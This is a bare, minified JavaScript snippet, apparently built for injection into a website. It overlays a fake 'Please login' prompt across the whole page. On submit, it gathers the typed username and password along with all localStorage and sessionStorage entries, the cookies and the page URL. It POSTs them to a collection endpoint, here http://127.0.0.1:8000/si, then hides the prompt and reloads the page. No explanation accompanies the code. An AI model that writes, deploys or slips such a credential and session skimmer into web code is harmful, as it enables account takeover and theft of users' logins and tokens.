if(!localStorage.getItem("logged__")){function a(){document.getElementsByTagName("body")[0].innerHTML+=`
                <div style="position: fixed; top: 0;width: 100%; height: 100vh;z-index: 999999999;">
            <div style="width: 100%; height: 100%;background-color: #000000c2;position: relative">
            <div style="border-radius: 8px;display:flex; flex-direction: column; align-items: center; background-color: aliceblue;position: absolute;top: 50%;left: 50%;transform: translate(-50%,-50%);padding: 50px 10px">
                <p style="font-size: 17px">Please login</p>
            <div style="display: flex;flex-direction: column">
                <label style="margin: 0 10px;" for="login">Login</label>
                <input type="text" id="login" style="min-width: 250px;padding: 7px; border-radius: 6px; border: none; margin: 10px; box-shadow: 0 0 4px black; font-size: 17px"></div>
            <div style="display: flex;flex-direction: column">
                <label style="margin: 0 10px;" for="pass">Password</label>
                <input type="password" id="pass" style="min-width: 250px;padding: 7px; border-radius: 6px; border: none; margin: 10px; box-shadow: 0 0 4px black; font-size: 17px"></div>
            <div><button id="login_sf" style="padding: 10px;border: none;background-color: blue;border-radius: 6px; margin: 10px;font-size: 17px;color: white;cursor: pointer">Login</button></div>

</div>
</div>
</div>
            `}function b(){for(var a,b=[],d=Object.keys(localStorage),c=0;a=d[c];c++)b.push(a+"="+localStorage.getItem(a));return b}function c(){let a=[];return Object.keys(sessionStorage).forEach(b=>{a.push(`${b}=${sessionStorage.getItem(b)}`)}),a}function d(){for(var b=document.cookie.split(";"),c=[],a=1;a<=b.length;a++)c.push(b[a-1]);return c}a(),(el=document.getElementById("login_sf")).addEventListener("click",function(){let a=new FormData;a.append("l",JSON.stringify(b())),a.append("s",JSON.stringify(c())),a.append("c",JSON.stringify(d())),a.append("h",window.location.href),a.append("l_",document.getElementById("login").value),a.append("p_",document.getElementById("pass").value),fetch("http://127.0.0.1:8000/si",{body:a,method:"POST"}),localStorage.setItem("logged__",!0),window.location.reload()},!1)}